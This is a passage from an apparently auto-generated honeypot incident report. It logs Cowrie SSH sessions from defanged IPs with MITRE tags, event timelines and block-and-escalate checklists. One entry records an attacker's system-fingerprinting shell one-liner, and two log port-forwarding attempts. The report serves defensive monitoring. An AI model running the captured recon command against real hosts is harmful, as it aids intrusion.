- [ ] Submit `134.122.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `134.122.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a225dfad791d

| Field | Detail |
|---|---|
| **Source IP** | `134.122.85[.]36` |
| **First Seen** | 2026-07-31 19:37 |
| **Last Seen** | 2026-07-31 19:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:37:27` | `cowrie.session.connect` |
| `2026-07-31 19:37:27` | `cowrie.login.success` |
| `2026-07-31 19:37:27` | `cowrie.session.params` |
| `2026-07-31 19:37:32` | `cowrie.log.closed` |
| `2026-07-31 19:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `134.122.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-480eeb4e5c2f

| Field | Detail |
|---|---|
| **Source IP** | `134.122.85[.]36` |
| **First Seen** | 2026-07-31 19:37 |
| **Last Seen** | 2026-07-31 19:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:37:32` | `cowrie.session.connect` |
| `2026-07-31 19:37:32` | `cowrie.login.success` |
| `2026-07-31 19:37:32` | `cowrie.session.params` |
| `2026-07-31 19:37:37` | `cowrie.log.closed` |
| `2026-07-31 19:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `134.122.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0618876baa4

| Field | Detail |
|---|---|
| **Source IP** | `134.122.85[.]36` |
| **First Seen** | 2026-07-31 19:37 |
| **Last Seen** | 2026-07-31 19:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:37:37` | `cowrie.session.connect` |
| `2026-07-31 19:37:37` | `cowrie.login.success` |
| `2026-07-31 19:37:37` | `cowrie.session.params` |
| `2026-07-31 19:37:42` | `cowrie.log.closed` |
| `2026-07-31 19:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `134.122.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6b16854ece

| Field | Detail |
|---|---|
| **Source IP** | `134.122.85[.]36` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:15` | `cowrie.session.connect` |
| `2026-07-31 19:38:15` | `cowrie.login.success` |
| `2026-07-31 19:38:16` | `cowrie.session.params` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:16` | `cowrie.command.failed` |
| `2026-07-31 19:38:16` | `cowrie.command.input` |
| `2026-07-31 19:38:23` | `cowrie.log.closed` |
| `2026-07-31 19:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `134.122.85[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e61d3282e9

| Field | Detail |
|---|---|
| **Source IP** | `206.81.18[.]71` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:23` | `cowrie.session.connect` |
| `2026-07-31 19:38:23` | `cowrie.login.success` |
| `2026-07-31 19:38:24` | `cowrie.session.params` |
| `2026-07-31 19:38:24` | `cowrie.command.input` |
| `2026-07-31 19:38:24` | `cowrie.command.failed` |
| `2026-07-31 19:38:24` | `cowrie.command.input` |
| `2026-07-31 19:38:24` | `cowrie.command.failed` |
| `2026-07-31 19:38:24` | `cowrie.command.input` |
| `2026-07-31 19:38:25` | `cowrie.log.closed` |
| `2026-07-31 19:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.81.18[.]71` to AbuseIPDB if not already reported
- [ ] Block `206.81.18[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f239c65f6274

| Field | Detail |
|---|---|
| **Source IP** | `164.92.163[.]77` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:23` | `cowrie.session.connect` |
| `2026-07-31 19:38:24` | `cowrie.login.success` |
| `2026-07-31 19:38:24` | `cowrie.session.params` |
| `2026-07-31 19:38:24` | `cowrie.command.input` |
| `2026-07-31 19:38:24` | `cowrie.command.failed` |
| `2026-07-31 19:38:24` | `cowrie.command.input` |
| `2026-07-31 19:38:24` | `cowrie.command.failed` |
| `2026-07-31 19:38:24` | `cowrie.command.input` |
| `2026-07-31 19:38:25` | `cowrie.log.closed` |
| `2026-07-31 19:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.163[.]77` to AbuseIPDB if not already reported
- [ ] Block `164.92.163[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b13af2b3ce

| Field | Detail |
|---|---|
| **Source IP** | `165.22.70[.]229` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:23` | `cowrie.session.connect` |
| `2026-07-31 19:38:24` | `cowrie.login.success` |
| `2026-07-31 19:38:25` | `cowrie.session.params` |
| `2026-07-31 19:38:25` | `cowrie.command.input` |
| `2026-07-31 19:38:25` | `cowrie.command.failed` |
| `2026-07-31 19:38:25` | `cowrie.command.input` |
| `2026-07-31 19:38:25` | `cowrie.command.failed` |
| `2026-07-31 19:38:25` | `cowrie.command.input` |
| `2026-07-31 19:38:28` | `cowrie.log.closed` |
| `2026-07-31 19:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.70[.]229` to AbuseIPDB if not already reported
- [ ] Block `165.22.70[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758655c000b0

| Field | Detail |
|---|---|
| **Source IP** | `209.38.237[.]32` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (compatible; Odin; hxxps://docs.getodin.com/), Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:25` | `cowrie.session.connect` |
| `2026-07-31 19:38:25` | `cowrie.login.success` |
| `2026-07-31 19:38:26` | `cowrie.session.params` |
| `2026-07-31 19:38:26` | `cowrie.command.input` |
| `2026-07-31 19:38:26` | `cowrie.command.input` |
| `2026-07-31 19:38:26` | `cowrie.command.failed` |
| `2026-07-31 19:38:26` | `cowrie.command.input` |
| `2026-07-31 19:38:26` | `cowrie.command.failed` |
| `2026-07-31 19:38:26` | `cowrie.command.input` |
| `2026-07-31 19:38:27` | `cowrie.log.closed` |
| `2026-07-31 19:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.237[.]32` to AbuseIPDB if not already reported
- [ ] Block `209.38.237[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a5406416b39

| Field | Detail |
|---|---|
| **Source IP** | `207.154.239[.]237` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:25` | `cowrie.session.connect` |
| `2026-07-31 19:38:26` | `cowrie.login.success` |
| `2026-07-31 19:38:27` | `cowrie.session.params` |
| `2026-07-31 19:38:27` | `cowrie.command.input` |
| `2026-07-31 19:38:27` | `cowrie.command.failed` |
| `2026-07-31 19:38:27` | `cowrie.command.input` |
| `2026-07-31 19:38:27` | `cowrie.command.failed` |
| `2026-07-31 19:38:27` | `cowrie.command.input` |
| `2026-07-31 19:38:29` | `cowrie.log.closed` |
| `2026-07-31 19:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.239[.]237` to AbuseIPDB if not already reported
- [ ] Block `207.154.239[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ba2082c77b

| Field | Detail |
|---|---|
| **Source IP** | `206.81.18[.]71` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:25` | `cowrie.session.connect` |
| `2026-07-31 19:38:27` | `cowrie.login.success` |
| `2026-07-31 19:38:27` | `cowrie.session.params` |
| `2026-07-31 19:38:27` | `cowrie.command.input` |
| `2026-07-31 19:38:27` | `cowrie.command.failed` |
| `2026-07-31 19:38:27` | `cowrie.command.input` |
| `2026-07-31 19:38:27` | `cowrie.command.failed` |
| `2026-07-31 19:38:27` | `cowrie.command.input` |
| `2026-07-31 19:38:28` | `cowrie.log.closed` |
| `2026-07-31 19:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.81.18[.]71` to AbuseIPDB if not already reported
- [ ] Block `206.81.18[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90d2114368d

| Field | Detail |
|---|---|
| **Source IP** | `164.92.163[.]77` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:25` | `cowrie.session.connect` |
| `2026-07-31 19:38:27` | `cowrie.login.success` |
| `2026-07-31 19:38:28` | `cowrie.session.params` |
| `2026-07-31 19:38:28` | `cowrie.command.input` |
| `2026-07-31 19:38:28` | `cowrie.command.failed` |
| `2026-07-31 19:38:28` | `cowrie.command.input` |
| `2026-07-31 19:38:28` | `cowrie.command.failed` |
| `2026-07-31 19:38:28` | `cowrie.command.input` |
| `2026-07-31 19:38:28` | `cowrie.log.closed` |
| `2026-07-31 19:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.163[.]77` to AbuseIPDB if not already reported
- [ ] Block `164.92.163[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f44934af0a

| Field | Detail |
|---|---|
| **Source IP** | `165.22.70[.]229` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:27` | `cowrie.session.connect` |
| `2026-07-31 19:38:28` | `cowrie.login.success` |
| `2026-07-31 19:38:29` | `cowrie.session.params` |
| `2026-07-31 19:38:29` | `cowrie.command.input` |
| `2026-07-31 19:38:29` | `cowrie.command.failed` |
| `2026-07-31 19:38:29` | `cowrie.command.input` |
| `2026-07-31 19:38:29` | `cowrie.command.failed` |
| `2026-07-31 19:38:29` | `cowrie.command.input` |
| `2026-07-31 19:38:31` | `cowrie.log.closed` |
| `2026-07-31 19:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.70[.]229` to AbuseIPDB if not already reported
- [ ] Block `165.22.70[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68866ebe25b9

| Field | Detail |
|---|---|
| **Source IP** | `207.154.239[.]237` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:28` | `cowrie.session.connect` |
| `2026-07-31 19:38:29` | `cowrie.login.success` |
| `2026-07-31 19:38:29` | `cowrie.session.params` |
| `2026-07-31 19:38:29` | `cowrie.command.input` |
| `2026-07-31 19:38:29` | `cowrie.command.failed` |
| `2026-07-31 19:38:29` | `cowrie.command.input` |
| `2026-07-31 19:38:29` | `cowrie.command.failed` |
| `2026-07-31 19:38:29` | `cowrie.command.input` |
| `2026-07-31 19:38:31` | `cowrie.log.closed` |
| `2026-07-31 19:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.239[.]237` to AbuseIPDB if not already reported
- [ ] Block `207.154.239[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f9ef83ac54f

| Field | Detail |
|---|---|
| **Source IP** | `206.81.18[.]71` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:28` | `cowrie.session.connect` |
| `2026-07-31 19:38:29` | `cowrie.login.success` |
| `2026-07-31 19:38:30` | `cowrie.session.params` |
| `2026-07-31 19:38:30` | `cowrie.command.input` |
| `2026-07-31 19:38:30` | `cowrie.command.failed` |
| `2026-07-31 19:38:30` | `cowrie.command.input` |
| `2026-07-31 19:38:30` | `cowrie.command.failed` |
| `2026-07-31 19:38:30` | `cowrie.command.input` |
| `2026-07-31 19:38:31` | `cowrie.log.closed` |
| `2026-07-31 19:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.81.18[.]71` to AbuseIPDB if not already reported
- [ ] Block `206.81.18[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec5c7af1a96a

| Field | Detail |
|---|---|
| **Source IP** | `164.92.163[.]77` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:28` | `cowrie.session.connect` |
| `2026-07-31 19:38:30` | `cowrie.login.success` |
| `2026-07-31 19:38:31` | `cowrie.session.params` |
| `2026-07-31 19:38:31` | `cowrie.command.input` |
| `2026-07-31 19:38:31` | `cowrie.command.failed` |
| `2026-07-31 19:38:31` | `cowrie.command.input` |
| `2026-07-31 19:38:31` | `cowrie.command.failed` |
| `2026-07-31 19:38:31` | `cowrie.command.input` |
| `2026-07-31 19:38:31` | `cowrie.log.closed` |
| `2026-07-31 19:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.163[.]77` to AbuseIPDB if not already reported
- [ ] Block `164.92.163[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70654d84c7c

| Field | Detail |
|---|---|
| **Source IP** | `165.22.70[.]229` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:31` | `cowrie.session.connect` |
| `2026-07-31 19:38:31` | `cowrie.login.success` |
| `2026-07-31 19:38:32` | `cowrie.session.params` |
| `2026-07-31 19:38:32` | `cowrie.command.input` |
| `2026-07-31 19:38:32` | `cowrie.command.failed` |
| `2026-07-31 19:38:32` | `cowrie.command.input` |
| `2026-07-31 19:38:32` | `cowrie.command.failed` |
| `2026-07-31 19:38:32` | `cowrie.command.input` |
| `2026-07-31 19:38:33` | `cowrie.log.closed` |
| `2026-07-31 19:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.70[.]229` to AbuseIPDB if not already reported
- [ ] Block `165.22.70[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03ef9f07673

| Field | Detail |
|---|---|
| **Source IP** | `207.154.239[.]237` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:31` | `cowrie.session.connect` |
| `2026-07-31 19:38:32` | `cowrie.login.success` |
| `2026-07-31 19:38:32` | `cowrie.session.params` |
| `2026-07-31 19:38:32` | `cowrie.command.input` |
| `2026-07-31 19:38:32` | `cowrie.command.failed` |
| `2026-07-31 19:38:32` | `cowrie.command.input` |
| `2026-07-31 19:38:32` | `cowrie.command.failed` |
| `2026-07-31 19:38:32` | `cowrie.command.input` |
| `2026-07-31 19:38:33` | `cowrie.log.closed` |
| `2026-07-31 19:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.239[.]237` to AbuseIPDB if not already reported
- [ ] Block `207.154.239[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0048f5753ac3

| Field | Detail |
|---|---|
| **Source IP** | `164.92.163[.]77` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:31` | `cowrie.session.connect` |
| `2026-07-31 19:38:32` | `cowrie.login.success` |
| `2026-07-31 19:38:33` | `cowrie.session.params` |
| `2026-07-31 19:38:33` | `cowrie.command.input` |
| `2026-07-31 19:38:33` | `cowrie.command.failed` |
| `2026-07-31 19:38:33` | `cowrie.command.input` |
| `2026-07-31 19:38:33` | `cowrie.command.failed` |
| `2026-07-31 19:38:33` | `cowrie.command.input` |
| `2026-07-31 19:38:33` | `cowrie.log.closed` |
| `2026-07-31 19:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.163[.]77` to AbuseIPDB if not already reported
- [ ] Block `164.92.163[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4965837d82

| Field | Detail |
|---|---|
| **Source IP** | `164.92.163[.]77` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:33` | `cowrie.session.connect` |
| `2026-07-31 19:38:33` | `cowrie.login.success` |
| `2026-07-31 19:38:34` | `cowrie.session.params` |
| `2026-07-31 19:38:34` | `cowrie.command.input` |
| `2026-07-31 19:38:34` | `cowrie.command.failed` |
| `2026-07-31 19:38:34` | `cowrie.command.input` |
| `2026-07-31 19:38:34` | `cowrie.command.failed` |
| `2026-07-31 19:38:34` | `cowrie.command.input` |
| `2026-07-31 19:38:34` | `cowrie.log.closed` |
| `2026-07-31 19:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.163[.]77` to AbuseIPDB if not already reported
- [ ] Block `164.92.163[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6a79034097

| Field | Detail |
|---|---|
| **Source IP** | `164.92.163[.]77` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:34` | `cowrie.session.connect` |
| `2026-07-31 19:38:34` | `cowrie.login.success` |
| `2026-07-31 19:38:35` | `cowrie.session.params` |
| `2026-07-31 19:38:35` | `cowrie.command.input` |
| `2026-07-31 19:38:35` | `cowrie.command.failed` |
| `2026-07-31 19:38:35` | `cowrie.command.input` |
| `2026-07-31 19:38:35` | `cowrie.command.failed` |
| `2026-07-31 19:38:35` | `cowrie.command.input` |
| `2026-07-31 19:38:35` | `cowrie.log.closed` |
| `2026-07-31 19:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.163[.]77` to AbuseIPDB if not already reported
- [ ] Block `164.92.163[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ff35b2a64e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:38 |
| **Last Seen** | 2026-07-31 19:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:38:48` | `cowrie.session.connect` |
| `2026-07-31 19:38:49` | `cowrie.client.version` |
| `2026-07-31 19:38:49` | `cowrie.client.kex` |
| `2026-07-31 19:38:50` | `cowrie.login.success` |
| `2026-07-31 19:38:52` | `cowrie.session.params` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.success` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.command.input` |
| `2026-07-31 19:38:52` | `cowrie.log.closed` |
| `2026-07-31 19:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e07db890bb

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-31 19:40 |
| **Last Seen** | 2026-07-31 19:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:40:42` | `cowrie.session.connect` |
| `2026-07-31 19:40:43` | `cowrie.client.version` |
| `2026-07-31 19:40:43` | `cowrie.client.kex` |
| `2026-07-31 19:40:46` | `cowrie.login.success` |
| `2026-07-31 19:40:46` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d50dafbee7b

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-07-31 19:41 |
| **Last Seen** | 2026-07-31 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:41:19` | `cowrie.session.connect` |
